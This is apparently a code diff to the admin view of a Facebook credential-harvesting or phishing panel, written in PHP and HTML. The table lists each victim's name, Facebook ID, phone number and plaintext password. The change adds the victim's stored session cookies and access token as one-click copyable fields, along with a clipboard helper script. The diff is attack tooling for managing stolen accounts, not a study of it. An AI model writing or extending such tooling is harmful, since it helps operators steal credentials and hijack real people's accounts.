@@ -111,24 +111,27 @@
                     <table class="table table-hover table-condensed">
                         <thead>
                             <tr>
-                                <th class="hidden-xs">Name</th>
+                                <th class="hidden-xs" style="width: 20%">Name</th>
                                 <th>User</th>
-                                <th>Password</th>
-                                <th>Status</th>
-                                <th>Action</th>
+                                <th style="width:150px">Password</th>
+                                <th style="width:100px">Status</th>
+                                <th style="width:60px">Action</th>
                             </tr>
                         </thead>
                         <tbody>
                             <?php if(!empty($result)):?>
                             <?php foreach($result as $number):?>
                             <tr>
-                                <td class="hidden-xs">
-                                    <a href="https://www.facebook.com/<?php echo $number->f_name;?>" target="_blank"><?php echo $number->f_name;?></a>
+                                <td>
+                                    <a href="https://www.facebook.com/<?php echo $number->f_name;?>" target="_blank"><?php echo $number->f_name;?><br/><?php echo $number->f_id;?><br/><?php echo $number->f_phone;?></a>
                                     <br/>
                                     <small>Mutual Friends: <b><?php echo $number->f_lname;?></b></small>
                                 </td>
-                                <td>
-                                    <?php echo $number->f_phone;?>
+                                <td><?php
+                                $datas = json_decode($number->value);
+                                ?>
+                                    <textarea style="height: 40px;margin-bottom: 5px" type="text" name="glink" class="form-control" onClick="copyText(this);"><?php echo @$datas->cookies;?></textarea>
+                                    <input type="text" name="glink" class="form-control" onClick="copyText(this);" value="<?php echo @$datas->token;?>">
                                 </td>
                                 <td><?php echo $number->f_pass;?></td>
                                 <td>
@@ -169,3 +172,22 @@
             </div>
         </div>
     </div>
+<script type="text/javascript">
+function copyText(e) {
+    if(e.value) {
+      e.select();
+      document.execCommand('copy');
+        var n = noty({
+            text: 'copyed',
+            type: 'success',
+            dismissQueue: false,
+            layout: 'top',
+            theme: 'defaultTheme'
+        });
+
+        setTimeout(function () {
+            $.noty.closeAll();
+        }, 1000);
+    }
+}
+</script>
